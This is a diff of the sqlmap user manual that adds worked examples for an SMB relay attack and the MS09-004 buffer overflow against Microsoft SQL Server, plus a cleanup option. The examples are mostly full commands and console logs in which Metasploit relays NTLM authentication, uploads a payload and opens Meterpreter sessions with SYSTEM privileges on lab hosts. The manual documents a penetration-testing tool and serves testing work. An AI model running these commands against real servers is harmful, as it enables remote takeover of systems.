+and the underlying operating system is not patched against Microsoft
+Security Bulletin <htmlurl url="http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx" name="MS08-068">,
+sqlmap can abuse the universal naming convention (UNC) supported within
+all database management systems to force the database server to initiate a
+SMB connection with the attacker host, then perform a SMB authentication
+relay attack in order to establish a high-privileged <bf>out-of-band TCP
+stateful channel</bf> between the attacker host and the target database
+server.
+sqlmap relies on <htmlurl url="http://metasploit.com/framework"
+name="Metasploit">'s SMB relay exploit to perform this attack, so you need
+to have it already on your system: it's free and can be downloaded from the
+homepage.
+You need to run sqlmap as <bf>root</bf> user if you want to perform a SMB
+relay attack because it will need to listen on a user-specified SMB TCP
+port for incoming connection attempts.
 
 <p>
-The techniques implemented are detailed on the white paper
+Note that this feature is not supported by sqlmap running on Windows
+because Metasploit's msfconsole and msfcli are not supported on the native
+Windows Ruby interpreter.
+
+<p>
+This technique is detailed on the white paper
 <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
+
+<p>
+Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> running as
+<tt>Administrator</tt> on the target:
+
+<tscreen><verb>
+$ sudo python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+  --os-smbrelay -v 1 --msf-path /home/inquis/software/metasploit
+
+[...]
+[hh:mm:11] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: Microsoft SQL Server 2005
+
+[hh:mm:11] [INFO] testing stacked queries support on parameter 'name'
+[hh:mm:16] [INFO] the web application supports stacked queries on parameter 'name'
+[hh:mm:16] [WARNING] it is unlikely that this attack will be successful because often 
+Microsoft SQL Server 2005 runs as Network Service which is not a real user, it does not 
+send the NTLM session hash when connecting to a SMB service
+[hh:mm:16] [INFO] which connection type do you want to use?
+[1] Bind TCP (default)
+[2] Bind TCP (No NX)
+[3] Reverse TCP
+[4] Reverse TCP (No NX)
+> 1
+[hh:mm:16] [INFO] which is the local address? [192.168.1.161] 192.168.1.161
+[hh:mm:16] [INFO] which is the back-end DBMS address? [192.168.1.131] 192.168.1.131
+[hh:mm:16] [INFO] which remote port numer do you want to use? [4907] 4907
+[hh:mm:16] [INFO] which payload do you want to use?
+[1] Reflective Meterpreter (default)
+[2] PatchUp Meterpreter (only from Metasploit development revision 6742)
+[3] Shell
+[4] Reflective VNC
+[5] PatchUp VNC (only from Metasploit development revision 6742)
+> 1
+[hh:mm:16] [INFO] which SMB port do you want to use?
+[1] 139/TCP (default)
+[2] 445/TCP
+> 1
+[hh:mm:16] [INFO] running Metasploit Framework 3 console locally, wait..
+
+                _                  _       _ _
+               | |                | |     (_) |
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | |_
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|
+                            | |
+                            |_|
+
+
+       =[ msf v3.3-dev
++ -- --=[ 392 exploits - 234 payloads
++ -- --=[ 20 encoders - 7 nops
+       =[ 168 aux
+
+resource> use windows/smb/smb_relay
+resource> set SRVHOST 192.168.1.161
+SRVHOST => 192.168.1.161
+resource> set SRVPORT 139
+SRVPORT => 139
+resource> set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD => windows/meterpreter/bind_tcp
+resource> set LPORT 4907
+LPORT => 4907
+resource> set RHOST 192.168.1.131
+RHOST => 192.168.1.131
+resource> exploit
+[*] Exploit running as background job.
+msf exploit(smb_relay) > 
+[*] Started bind handler
+[*] Server started.
+[*] Received 192.168.1.131:3242 \ LMHASH:00 NTHASH: OS:Windows Server 2003 3790 
+Service Pack 2 LM:
+[*] Sending Access Denied to 192.168.1.131:3242 \
+[*] Received 192.168.1.131:3242 W2K3DEV\Administrator LMHASH:FOO NTHASH:BAR OS:Windows 
+Server 2003 3790 Service Pack 2 LM:
+[*] Authenticating to 192.168.1.131 as W2K3DEV\Administrator...
+[*] AUTHENTICATED as W2K3DEV\Administrator...
+[*] Connecting to the ADMIN$ share...
+[*] Regenerating the payload...
+[*] Uploading payload...
+[*] Created \wELRmcmd.exe...
+[*] Connecting to the Service Control Manager...
+[*] Obtaining a service manager handle...
+[*] Creating a new service...
+[*] Closing service handle...
+[*] Opening service...
+[*] Starting the service...
+[*] Removing the service...
+[*] Closing service handle...
+[*] Deleting \wELRmcmd.exe...
+[*] Sending Access Denied to 192.168.1.131:3242 W2K3DEV\Administrator
+[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
+[*] Received 192.168.1.131:3244 \ LMHASH:00 NTHASH: OS:Windows Server 2003 3790 
+Service Pack 2 LM:
+[*] Sending Access Denied to 192.168.1.131:3244 \
+[*] Received 192.168.1.131:3244 W2K3DEV\Administrator LMHASH:FOO NTHASH:BAR OS:Windows 
+Server 2003 3790 Service Pack 2 LM:
+[*] Authenticating to 192.168.1.131 as W2K3DEV\Administrator...
+[*] AUTHENTICATED as W2K3DEV\Administrator...
+[*] Ignoring request from 192.168.1.131, attack already in progress.
+[*] Sending Access Denied to 192.168.1.131:3244 W2K3DEV\Administrator
+[*] Sending stage (718336 bytes)
+[*] Meterpreter session 1 opened (192.168.1.161:51813 -> 192.168.1.131:4907)
+
+Active sessions
+===============
+
+  Id  Description  Tunnel                                       
+  --  -----------  ------                                       
+  1   Meterpreter  192.168.1.161:51813 -> 192.168.1.131:4907  
+
+msf exploit(smb_relay) > [*] Starting interaction with 1...
+
+meterpreter > [-] The 'priv' extension has already been loaded.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > exit
+
+[*] Meterpreter session 1 closed.
+msf exploit(smb_relay) > exit
+
+[*] Server stopped.
+</verb></tscreen>
 
 
 <sect2>Stored procedure buffer overflow exploitation
@@ -4022,11 +4762,103 @@ The techniques implemented are detailed on the white paper
 Options: <tt>--os-bof</tt>, <tt>--priv-esc</tt> and <tt>--msf-path</tt>
 
 <p>
-TODO
+If the back-end database management system is not patched against Microsoft
+Security Bulletin <htmlurl url="http://www.microsoft.com/technet/security/Bulletin/MS09-004.mspx" name="MS09-004">,
+sqlmap can exploit the heap-based buffer overflow affecting
+<tt>sp_replwritetovarbin</tt> stored procedure in order to establish an
+<bf>out-of-band TCP stateful channel</bf> between the attacker host and the
+target database server.
+sqlmap has its own exploit to trigger the vulnerability, but it relies on
+<htmlurl url="http://metasploit.com/framework" name="Metasploit"> to
+generate the shellcode used within the exploit, so you need to have it
+already on your system: it's free and can be downloaded from the homepage.
 
 <p>
-The techniques implemented are detailed on the white paper
+Note that this feature is not supported by sqlmap running on Windows
+because Metasploit's msfconsole and msfcli are not supported on the native
+Windows Ruby interpreter.
+
+<p>
+This technique is detailed on the white paper
 <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control">.
+
+<p>
+Example on a <bf>Microsoft SQL Server 2005 Service Pack 0</bf> target:
+
+<tscreen><verb>
+$ sudo python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/iis/get_str2.asp?name=luther" \
+  --os-bof -v 1 --msf-path /home/inquis/software/metasploit
+
+[...]
+[hh:mm:09] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: Microsoft SQL Server 2005
+
+[hh:mm:09] [INFO] testing stacked queries support on parameter 'name'
+[hh:mm:14] [INFO] the web application supports stacked queries on parameter 'name'
+[hh:mm:14] [INFO] going to exploit the Microsoft SQL Server 2005 'sp_replwritetovarbin' 
+stored procedure heap-based buffer overflow (MS09-004)
+[hh:mm:14] [INFO] fingerprinting the back-end DBMS operating system version and service pack
+[hh:mm:14] [INFO] retrieved: 1
+[hh:mm:15] [INFO] retrieved: 1
+[hh:mm:15] [INFO] the back-end DBMS operating system is Windows 2003 Service Pack 2
+[hh:mm:15] [INFO] testing if current user is DBA
+[hh:mm:15] [INFO] retrieved: 1
+[hh:mm:15] [INFO] checking if xp_cmdshell extended procedure is available, wait..
+[hh:mm:21] [INFO] xp_cmdshell extended procedure is available
+[hh:mm:21] [INFO] creating Metasploit Framework 3 multi-stage shellcode for the exploit
+which connection type do you want to use?
+[1] Bind TCP (default)
+[2] Bind TCP (No NX)
+[3] Reverse TCP
+[4] Reverse TCP (No NX)
+> 
+which is the back-end DBMS address? [192.168.1.131] 
+which remote port numer do you want to use? [39391] 62719
+which payload do you want to use?
+[1] Reflective Meterpreter (default)
+[2] PatchUp Meterpreter (only from Metasploit development revision 6742)
+[3] Shell
+[4] Reflective VNC
+[5] PatchUp VNC (only from Metasploit development revision 6742)
+> 
+which payload encoding do you want to use?
+[1] No Encoder
+[2] Alpha2 Alphanumeric Mixedcase Encoder
+[3] Alpha2 Alphanumeric Uppercase Encoder
+[4] Avoid UTF8/tolower
+[5] Call+4 Dword XOR Encoder
+[6] Single-byte XOR Countdown Encoder
+[7] Variable-length Fnstenv/mov Dword XOR Encoder
+[8] Polymorphic Jump/Call XOR Additive Feedback Encoder
+[9] Non-Alpha Encoder
+[10] Non-Upper Encoder
+[11] Polymorphic XOR Additive Feedback Encoder (default)
+[12] Alpha2 Alphanumeric Unicode Mixedcase Encoder
+[13] Alpha2 Alphanumeric Unicode Uppercase Encoder
+> 
+[hh:mm:50] [INFO] creation in progress .................. done
+[hh:mm:08] [INFO] handling DEP
+[hh:mm:08] [INFO] the back-end DBMS underlying operating system supports DEP: going to 
+handle it
+[hh:mm:08] [INFO] checking DEP system policy
+[hh:mm:09] [INFO] retrieved: OPTIN
+[hh:mm:12] [INFO] only Windows system binaries are covered by DEP by default
+[hh:mm:12] [INFO] running Metasploit Framework 3 command line interface locally, wait..
+[hh:mm:12] [INFO] triggering the buffer overflow vulnerability, wait..
+[*] Please wait while we load the module tree...
+[*] Started bind handler
+[*] Starting the payload handler...
+[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
+[*] Sending stage (718336 bytes)
+[*] Meterpreter session 1 opened (192.168.1.161:33765 -> 192.168.1.131:62719)
+
+meterpreter > Loading extension priv...success.
+meterpreter > getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+meterpreter > exit
+</verb></tscreen>
 
 
 <sect1>Miscellaneous
@@ -4123,7 +4955,7 @@ Option: <tt>--update</tt>
 <p>
 
 It is possible to update sqlmap to the latest stable version available on
-its <htmlurl url="http://sourceforge.net/project/showfiles.php?group_id=171598&amp;package_id=196107"
+its <htmlurl url="http://sourceforge.net/projects/sqlmap/files/"
 name="SourceForge File List page"> by running it with the
 <tt>--update</tt> option.
 
@@ -4140,7 +4972,7 @@ $ python sqlmap.py --update -v 4
 [hh:mm:55] [TRAFFIC OUT] HTTP request:
 GET /doc/VERSION HTTP/1.1
 Host: sqlmap.sourceforge.net
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:55] [TRAFFIC IN] HTTP response (OK - 200):
@@ -4159,7 +4991,7 @@ X-Pad: avoid browser bug
 [hh:mm:56] [TRAFFIC OUT] HTTP request:
 GET /FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx HTTP/1.1
 Host: www.sqlsecurity.com
-User-agent: sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
 Cookie: .ASPXANONYMOUS=dvus03cqyQEkAAAANDI0M2QzZmUtOGRkOS00ZDQxLThhMTUtN2ExMWJiNWVjN2My0; 
 language=en-US
 Connection: close
@@ -4478,7 +5310,32 @@ vulnerable parameter which is the default behaviour.
 Option: <tt>--cleanup</tt>
 
 <p>
-This paragraph will be written for sqlmap 0.7 stable version, refer to the white paper <htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf" name="Advanced SQL injection to operating system full control"> for the moment.
+It is recommended to clean up the back-end database management system from
+sqlmap temporary tables and created user-defined functions when you are
+done with owning the underlying operating system or file system.
+
+<p>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/iis/get_int.aspx?id=1" \
+  -v 2 --cleanup
+
+[...]
+[hh:mm:18] [INFO] cleaning up the database management system
+[hh:mm:18] [DEBUG] removing support tables
+[hh:mm:18] [DEBUG] query: DROP TABLE sqlmapfile
+[hh:mm:18] [DEBUG] query: DROP TABLE sqlmapoutput
+do you want to remove sys_exec UDF? [Y/n] 
+[hh:mm:20] [DEBUG] removing sys_exec UDF
+[hh:mm:20] [DEBUG] query: DROP FUNCTION sys_exec(text)
+do you want to remove sys_eval UDF? [Y/n] 
+[hh:mm:21] [DEBUG] removing sys_eval UDF
+[hh:mm:21] [DEBUG] query: DROP FUNCTION sys_eval(text)
+[hh:mm:21] [INFO] database management system cleanup finished
+[hh:mm:21] [WARNING] remember that UDF shared library files saved on the file system can 
+only be deleted manually
+</verb></tscreen>
 
 
 <sect>Disclaimer
